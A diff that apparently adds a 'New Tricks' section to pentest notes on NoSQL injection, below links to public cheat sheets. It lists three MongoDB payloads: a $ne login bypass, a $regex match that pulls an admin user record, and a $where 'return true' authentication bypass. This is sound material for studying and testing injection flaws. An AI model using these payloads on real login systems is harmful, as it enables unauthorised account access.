@@ -75,3 +75,17 @@ Some other resources you may want to refer to may be:
 - [PayloadAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
 - [HackTricks - NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
 - [NullSweep - NoSQL Injection Cheatsheet](https://nullsweep.com/nosql-injection-cheatsheet/)
+
+## New Tricks
+
+### Trick 1
+- Scenario: Login bypass with Mongo operator injection in JSON body.
+- Payload: `{"username":{"$ne":null},"password":{"$ne":null}}`
+
+### Trick 2
+- Scenario: Regex wildcard dumped first matching admin user document.
+- Payload: `{"username":{"$regex":"^adm"},"password":{"$regex":".*"}}`
+
+### Trick 3
+- Scenario: Boolean condition forced auth true in legacy $where handler.
+- Payload: `{"$where":"return true"}`
